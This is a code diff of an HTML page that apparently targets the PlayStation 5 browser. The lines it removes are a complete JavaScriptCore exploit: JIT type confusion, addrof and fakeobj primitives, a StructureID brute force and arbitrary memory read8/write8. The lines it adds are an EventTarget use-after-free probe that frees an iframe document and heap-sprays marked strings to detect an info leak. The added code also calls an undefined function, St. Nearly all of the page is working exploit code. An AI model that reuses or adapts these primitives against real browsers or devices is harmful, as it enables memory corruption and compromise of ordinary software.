@@ -2,178 +2,236 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 JSC v69</title>
+<title>PS5 EventTarget — Third Listener (Low Memory)</title>
 <style>
-body{background:#0a0a0a;color:#00ff41;font-family:monospace;padding:20px}
-pre{white-space:pre-wrap;word-wrap:break-word}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
+font-family:'MS Gothic','Courier New',monospace}
+#out{position:fixed;top:0;left:0;right:0;bottom:0;
+padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55}
+.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
 </style>
 </head>
 <body>
-<pre id="o"></pre>
+<div id="out"></div>
+<button id="btn" style="position:fixed;top:10px;right:10px;z-index:999;
+padding:10px 20px;background:#333;color:#0f0;border:1px solid #0f0;
+cursor:pointer;font-family:monospace">▶ TRIGGER</button>
 <script>
-var o=document.getElementById("o");
-function p(m){o.textContent+=m+"\n"}
+"use strict";
 
-p("=== PS5 JSC Exploit v69 (v64 Original) ===\n");
+var O = document.getElementById("out");
+var btn = document.getElementById("btn");
 
-try{
-var arr=new Array(0x40_0000).fill(1.1);
-var ai=arr.length-1;
-var rc=[];
+function P(m, c) {
+    var s = document.createElement("span");
+    if (c) s.className = c;
+    s.textContent = m + "\n";
+    O.appendChild(s);
+    O.scrollTop = O.scrollHeight;
+}
+function Ok(m) { P("  ✅ " + m, "ok"); }
+function Fl(m) { P("  ✘ " + m, "er"); }
+function Hi(m) { P("  ► " + m, "hl"); }
+function Dm(m) { P("  " + m, ""); }
 
-function foo(f,k,n){
-var A={p0:0x41414141,p1:1.1,p2:2.2};
-arr[ai]=A;
-var gc=[];
-var a=new Date(1111);a[0]=1.1;
-for(var j=0;j<n;++j){gc.push(new ArrayBuffer(0x80_0000))}
-A.p2=gc;
-var b={p0:0x42424242,p1:1.1};
-var v=1.1;
-if(f){v=1.1}else{v=b}
-A.p1=v;
-var w=1.1;
-for(var i=0;i<1e6;++i){for(var j=0;j<k;++j){w=i;w=j}}
-b.p0=w;b.p1=a;
+// Build spray in chunks to avoid OOM
+// Start with smaller size and increase
+var SPRAY_SIZES = [4, 8, 12, 16, 24, 32, 48, 64]; // MB
+var currentSizeIndex = 0;
+
+function buildSpray(sizeMB) {
+    var targetBytes = sizeMB * 1024 * 1024;
+    var chunkSize = 1024 * 1024; // 1MB chunks
+    var chunks = [];
+    var built = 0;
+    
+    // First chunk: marker bytes
+    var firstChunk = 'PWN3D!!\x00\x01\x00\x00\x00\x00\x00\x00';
+    while (firstChunk.length < chunkSize) {
+        firstChunk += 'A';
+    }
+    chunks.push(firstChunk);
+    built += firstChunk.length;
+    
+    // Remaining chunks: all 'A's
+    while (built < targetBytes) {
+        var remaining = targetBytes - built;
+        var thisChunk = Math.min(chunkSize, remaining);
+        chunks.push('A'.repeat(thisChunk));
+        built += thisChunk;
+    }
+    
+    return chunks.join('');
 }
 
-function rec(n){if(n===0)return;n=n|0;rec(n-1)}
+var testCount = 0;
+var maxTests = 3;
 
-p("[*] Warmup...");
-foo(true,1,1);
-foo(false,1,1);
-for(var i=0;i<1000;++i)foo(false,0,0);
-p("[+] Warmup done");
-
-p("[*] Stack manipulation...");
-for(var i=0;i<10000;i++)rec(i);
-p("[+] Stack done");
-
-p("[*] Triggering overlap (max 500 attempts)...");
-var win=false;
-var ba,ua;
-
-for(var k=0;k<500&&!win;++k){
-foo(false,10,k%5+1);
-rec(10000);
-
-for(var i=0;i<3;++i)new ArrayBuffer(0x4000);
-var fd=arr[ai].p1.p1;
-var nc=13.37;
-for(var i=0;i<16;++i){
-var a2=[13.37,2.2,3.3,4.4,nc];
-rc.push(a2);
-if(fd[0]===13.37){win=true;ba=rc[rc.length-1];ba[0]={};ua=fd;break}
+function runTest() {
+    testCount++;
+    if (testCount > maxTests) {
+        P("\n✓ All tests complete.", "ok");
+        btn.textContent = "✓ DONE";
+        btn.disabled = false;
+        return;
+    }
+    
+    var spraySize = SPRAY_SIZES[currentSizeIndex];
+    P("========================================", "hl");
+    P("TEST #" + testCount + " — Spray: " + spraySize + "MB", "hl");
+    P("========================================\n", "hl");
+    
+    try {
+        Dm("Building " + spraySize + "MB spray string...");
+        var spray = buildSpray(spraySize);
+        Dm("Spray built: " + (spray.length / 1024 / 1024).toFixed(1) + "MB");
+        
+        var f = document.body.appendChild(document.createElement('iframe'));
+        var a = document.createElement('div');
+        var b = a.appendChild(document.createElement('div'));
+        var thirdFired = false;
+        var uafResult = null;
+        
+        // Listener 1: Frees Document
+        a.addEventListener('a', eval('(function() {\
+            document.adoptNode(a);\
+            f.remove();\
+            throw {\
+                line: 1, column: 1,\
+                sourceURL: spray\
+            };\
+        })'));
+        
+        // Listener 2: Buffer
+        a.addEventListener('a', function() {
+            Dm("  [2] Buffer listener");
+        });
+        
+        // Listener 3: AFTER throw
+        a.addEventListener('a', function() {
+            thirdFired = true;
+            Dm("  [3] FIRED after throw!");
+            
+            try {
+                var doc = f.contentDocument;
+                if (doc === null) {
+                    Dm("  contentDocument is null");
+                    uafResult = { status: "null" };
+                } else {
+                    Dm("  contentDocument is NOT null!");
+                    Dm("  nodeType: " + doc.nodeType);
+                    Dm("  URL: " + doc.URL);
+                    Dm("  title: " + doc.title);
+                    
+                    var props = {
+                        nodeType: doc.nodeType,
+                        URL: doc.URL,
+                        title: doc.title,
+                        characterSet: doc.characterSet
+                    };
+                    
+                    for (var k in props) {
+                        var v = String(props[k]);
+                        if (v.indexOf('PWN3D') !== -1) {
+                            Fl("  ★ LEAK! " + k + " contains spray!");
+                            Fl("  Starts: " + v.substring(0, 20));
+                        }
+                    }
+                    
+                    uafResult = { status: "reclaimed", props: props };
+                }
+            } catch (e) {
+                Dm("  Exception: " + e.message);
+                uafResult = { status: "error", error: e.message };
+            }
+        });
+        
+        // Bubble listener
+        b.addEventListener('a', function() {
+            f.contentDocument.adoptNode(a);
+        });
+        
+        Dm("Dispatching event with " + spraySize + "MB spray...");
+        b.dispatchEvent(new Event('a', { bubbles: true }));
+        
+        setTimeout(function() {
+            P("", "");
+            Hi("===== RESULTS =====");
+            
+            if (thirdFired) {
+                Ok("Third listener FIRED!");
+                if (uafResult) {
+                    Dm("Status: " + uafResult.status);
+                    if (uafResult.props) {
+                        for (var k in uafResult.props) {
+                            var v = String(uafResult.props[k]);
+                            Dm("  " + k + " = " + v.substring(0, 50));
+                        }
+                    }
+                    if (uafResult.error) Fl("Error: " + uafResult.error);
+                    
+                    if (uafResult.status === "reclaimed") {
+                        Ok("Document memory was accessible after UAF!");
+                        if (uafResult.props && uafResult.props.URL.indexOf('PWN3D') !== -1) {
+                            St("★★★ INFO LEAK ACHIEVED! ★★★");
+                        }
+                    }
+                }
+            } else {
+                Fl("Third listener did NOT fire");
+                Dm("WebKit stops dispatch after throw");
+            }
+            
+            // Cleanup
+            try { document.body.removeChild(f); } catch(e) {}
+            
+            // Next spray size
+            currentSizeIndex++;
+            if (currentSizeIndex >= SPRAY_SIZES.length) {
+                currentSizeIndex = 0;
+            }
+            
+            // Force GC before next test
+            Dm("\nGC pressure...");
+            for (var i = 0; i < 5; i++) {
+                var gc = [];
+                for (var j = 0; j < 100; j++) gc.push(new ArrayBuffer(65536));
+            }
+            spray = null;
+            
+            setTimeout(runTest, 1500);
+        }, 1000);
+        
+    } catch (e) {
+        Fl("OOM or exception at " + SPRAY_SIZES[currentSizeIndex] + "MB: " + e.message);
+        Dm("Trying next smaller size...");
+        currentSizeIndex++;
+        if (currentSizeIndex >= SPRAY_SIZES.length) {
+            currentSizeIndex = 0;
+        }
+        setTimeout(runTest, 1000);
+    }
 }
-if(k%50===0)p("  Attempt "+k+"/500...");
-}
 
-if(!win){p("[-] No overlap after 500 attempts");throw 0}
+btn.addEventListener('click', function() {
+    btn.textContent = "▶ RUNNING...";
+    btn.disabled = true;
+    P("\n\n", "");
+    P("♠ PS5 EventTarget UAF — Third Listener ♠", "hl");
+    P("========================================", "hl");
+    P("Tests " + SPRAY_SIZES.join(', ') + "MB sprays", "");
+    Dm("If third listener fires → WebKit continues dispatch");
+    Dm("If properties contain 'PWN3D' → Info Leak!");
+    P("", "");
+    testCount = 0;
+    currentSizeIndex = 0;
+    runTest();
+});
 
-p("[+] OVERLAP FOUND!");
-
-var ab=new ArrayBuffer(8);
-var u64=new BigUint64Array(ab);
-var f64=new Float64Array(ab);
-function i2f(v){u64[0]=v;return f64[0]}
-function f2i(f){f64[0]=f;return u64[0]}
-
-function addrof(obj){ba[0]=obj;return f2i(ua[0])}
-function fakeobj(addr){ua[0]=i2f(addr);return ba[0]}
-
-var t={x:1.1};
-var ta=addrof(t);
-p("[+] addrof(t) = 0x"+ta.toString(16));
-
-p("[*] Spraying for adjacent pair...");
-var sp=[];
-for(var i=0;i<500;++i)sp.push({p1:1.1,p2:2.2});
-
-var oA=null,oAa=0n;
-for(var i=1;i<sp.length;++i){
-var prev=addrof(sp[i-1]);
-var curr=addrof(sp[i]);
-if(curr-prev===0x20n){oA=sp[i-1];oAa=prev;p("[+] Pair at 0x"+oAa.toString(16));break}
-}
-
-if(!oA){p("[-] No pair");throw 0}
-
-var fa=fakeobj(oAa+0x10n);
-
-var kn=[13.37,2.2,3.3,4.4];
-var kna=addrof(kn);
-p("[+] Known array at 0x"+kna.toString(16));
-
-p("[*] Brute forcing StructureID...");
-var fs=false;
-var fc=0n;
-var fo=0n;
-
-var offs=[0x00n,0x08n,0x10n,0x18n,0x20n,0x28n,0x30n];
-
-for(var sid=0;sid<512&&!fs;++sid){
-var cv=BigInt(sid)|0x0024070000000000n;
-try{
-oA.p1=i2f(cv);
-for(var oi=0;oi<offs.length;++oi){
-oA.p2=i2f(kna+offs[oi]);
-try{
-var v=fa[0];
-if(v===13.37){fs=true;fc=cv;fo=offs[oi];p("[+] FOUND SID="+sid+" OFF=0x"+fo.toString(16));break}
-}catch(e2){}
-}
-}catch(e){}
-}
-
-if(!fs){
-p("[*] Trying alternate types...");
-var alts=[0x002403n,0x002406n,0x002408n];
-for(var ti=0;ti<alts.length&&!fs;++ti){
-for(var sid=0;sid<512&&!fs;++sid){
-var cv=BigInt(sid)|(alts[ti]<<32n);
-try{
-oA.p1=i2f(cv);
-for(var oi=0;oi<offs.length;++oi){
-oA.p2=i2f(kna+offs[oi]);
-try{
-var v=fa[0];
-if(typeof v==='number'&&v===13.37){fs=true;fc=cv;fo=offs[oi];p("[+] FOUND T="+ti+" SID="+sid+" OFF=0x"+fo.toString(16));break}
-}catch(e2){}
-}
-}catch(e){}
-}
-}
-}
-
-if(!fs){p("[-] No structure found");throw 0}
-
-oA.p1=i2f(fc);
-
-function read8(addr){oA.p2=i2f(addr);return f2i(fa[0])}
-function write8(addr,val){oA.p2=i2f(addr);fa[0]=i2f(val)}
-
-p("\n[*] Testing read8/write8...");
-var jsc=read8(kna);
-p("[+] read8(kna) = 0x"+jsc.toString(16));
-
-var bp=read8(kna+0x08n);
-p("[+] butterfly = 0x"+bp.toString(16));
-
-var e0=read8(bp);
-p("[+] elem[0] = "+i2f(e0)+" (expect 13.37)");
-
-write8(bp,f2i(99.99));
-p("[+] write8: kn[0] = "+kn[0]+" (expect 99.99)");
-
-p("\n=== SUCCESS! ===");
-p("addrof:  OK");
-p("fakeobj: OK");
-p("read8:   OK");
-p("write8:  OK");
-
-}catch(e){
-p("[-] ERROR: "+e);
-}
+P("Page loaded. Click button to start.", "");
+P("Starts with small spray (4MB) to avoid OOM.", "");
+P("If OOM occurs, it skips to next size.", "");
 </script>
 </body>
 </html>
